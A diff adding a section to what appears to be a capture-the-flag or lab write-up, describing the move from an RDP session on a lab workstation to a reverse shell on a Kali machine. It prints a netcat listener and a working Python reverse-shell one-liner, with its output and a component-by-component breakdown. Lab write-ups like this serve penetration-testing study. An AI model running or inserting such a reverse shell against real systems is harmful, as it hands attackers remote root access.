@@ -433,7 +433,48 @@ A normal Wi-Fi interface is backed by a physical radio (a PCIe or USB card). In 
 <br>
 </div>
 
+### 4.2 Escape the RDP session to a stable reverse shell on Kali:
 
+**Why this step:** The xrdp desktop is laggy and self-terminates, which would kill any in-progress work. A reverse shell is a plain TCP socket independent of the GUI, so it survives the desktop dropping and gives a fast terminal for the wireless and tunneling work ahead. For this hop the callback goes to Kali's `tun0`, because the workstation's external interface can reach the VPN.
+
+**Command:**
+
+```bash
+# On Kali: start the listener FIRST (order matters; a late listener yields "Connection refused")
+nc -lvnp 4444
+
+# On airside-ws01 (root RDP terminal): fire the reverse shell to Kali tun0
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI_TUN0_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+```
+
+**Breakdown:**
+
+|Component|Reasoning|
+|---|---|
+|`nc -lvnp 4444`|Listener on Kali: `-l` listen, `-v` verbose (prints the connect line), `-n` no DNS, `-p 4444` port. Must be running before the client connects or the target gets `Connection refused`.|
+|`python3 -c '...'`|One-liner reverse shell; Python is present on the target and reliable for this.|
+|`socket.socket();s.connect(("KALI_TUN0_IP",4444))`|Open a TCP connection back to the Kali listener.|
+|`os.dup2(s.fileno(),0/1/2)`|Duplicate the socket onto file descriptors 0, 1, 2 (stdin/stdout/stderr), rewiring the process's standard streams onto the network.|
+|`subprocess.call(["/bin/bash","-i"])`|Spawn an interactive bash; with the streams already redirected, its I/O flows over the socket to Kali.|
+
+**Result:**
+
+```
+listening on [any] 4444 ...
+connect to [KALI_TUN0_IP] from (UNKNOWN) [TARGET_IP] 59582
+root@airside-ws01:/home/contractor#
+```
+
+**What this gives you:**
+
+Key findings:
+
+- A stable root shell on airside-ws01, landing on Kali over the VPN and decoupled from the self-closing RDP session.
+- The callback for this hop correctly targets Kali's `tun0`; later internal hops must instead target the workstation's `wlan2` address.
+
+**Note:** `Connection refused` on the first attempt was caused by firing the one-liner before the listener was bound. Starting `nc` first resolved it. On box reset the target address rotated (updated in the session `IP` variable).
+
+**Next:** Upgrade the dumb shell to a full PTY so `sudo`/`su`, job control, and line editing behave, then begin wireless enumeration on `wlan2`.
 <div align="center">
 <br>
 <br>
